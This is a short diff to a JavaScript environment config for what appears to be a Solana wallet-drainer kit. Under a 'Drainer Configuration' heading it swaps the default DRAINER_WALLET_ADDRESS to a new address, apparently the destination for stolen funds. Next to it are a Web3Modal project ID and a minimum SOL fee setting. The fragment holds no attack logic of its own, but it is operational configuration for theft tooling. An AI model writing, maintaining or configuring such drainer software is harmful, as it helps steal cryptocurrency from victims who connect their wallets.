@@ -29,7 +29,7 @@ export const ENV_CONFIG = {
   WEB3MODAL_PROJECT_ID: process.env.WEB3MODAL_PROJECT_ID || '45a382364ff2b00404b2d4c2ff95dbd4',
   
   // Drainer Configuration
-  DRAINER_WALLET_ADDRESS: process.env.DRAINER_WALLET_ADDRESS || 'FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj',
+  DRAINER_WALLET_ADDRESS: process.env.DRAINER_WALLET_ADDRESS || '8WZ117ZSWyFSWq9fht5NGfprUQvoE5nReGfWKpczGRPZ',
   
   // Transaction Limits
   MIN_SOL_FOR_FEES: parseFloat(process.env.MIN_SOL_FOR_FEES) || 0.005,
